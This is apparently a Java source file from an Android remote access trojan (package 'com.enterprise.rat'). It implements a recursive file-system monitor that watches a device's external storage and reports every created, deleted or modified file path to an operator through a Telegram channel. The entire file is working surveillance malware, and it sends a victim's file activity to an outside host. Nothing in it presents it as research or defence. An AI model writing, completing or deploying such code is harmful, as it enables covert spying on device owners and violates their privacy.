package com.enterprise.rat.commands;

import android.os.Environment;
import android.os.FileObserver;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.util.Stack;

public class FileMonitorManager {
    private RecursiveFileObserver observer;

    public void startMonitor(String path) {
        if (observer != null) { TelegramApi.sendMessage("⚠ Monitor already running."); return; }
        File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
        if (!dir.exists() || !dir.isDirectory()) { TelegramApi.sendMessage("❌ Invalid directory."); return; }
        observer = new RecursiveFileObserver(dir.getAbsolutePath(), FileObserver.CREATE | FileObserver.DELETE | FileObserver.MODIFY);
        observer.setOnFileEventListener(filePath -> {
            TelegramApi.sendMessage("📂 File event: <code>" + filePath + "</code>");
        });
        observer.startWatching();
        TelegramApi.sendMessage("📂 File monitor started on: " + dir.getAbsolutePath());
    }

    public void stopMonitor() {
        if (observer != null) { observer.stopWatching(); observer = null; }
        TelegramApi.sendMessage("📂 File monitor stopped.");
    }

    static class RecursiveFileObserver extends FileObserver {
        private Stack<RecursiveFileObserver> childObservers = new Stack<>();
        private String rootPath;
        private OnFileEventListener listener;

        interface OnFileEventListener { void onFileEvent(String filePath); }

        RecursiveFileObserver(String path, int mask) {
            super(path, mask);
            this.rootPath = path;
        }

        void setOnFileEventListener(OnFileEventListener l) { this.listener = l; }

        @Override
        public void onEvent(int event, String relativePath) {
            if (relativePath == null || listener == null) return;
            String fullPath = rootPath + "/" + relativePath;
            listener.onFileEvent(fullPath);
        }

        @Override
        public void startWatching() {
            super.startWatching();
            File root = new File(rootPath);
            File[] children = root.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (child.isDirectory() && !child.getName().startsWith(".")) {
                        RecursiveFileObserver obs = new RecursiveFileObserver(child.getAbsolutePath(), getMask());
                        obs.setOnFileEventListener(listener);
                        obs.startWatching();
                        childObservers.push(obs);
                    }
                }
            }
        }

        @Override
        public void stopWatching() {
            super.stopWatching();
            while (!childObservers.isEmpty()) childObservers.pop().stopWatching();
        }

        int getMask() {
            try {
                java.lang.reflect.Field f = FileObserver.class.getDeclaredField("m_mask");
                f.setAccessible(true);
                return f.getInt(this);
            } catch (Exception e) { return FileObserver.ALL_EVENTS; }
        }
    }
}
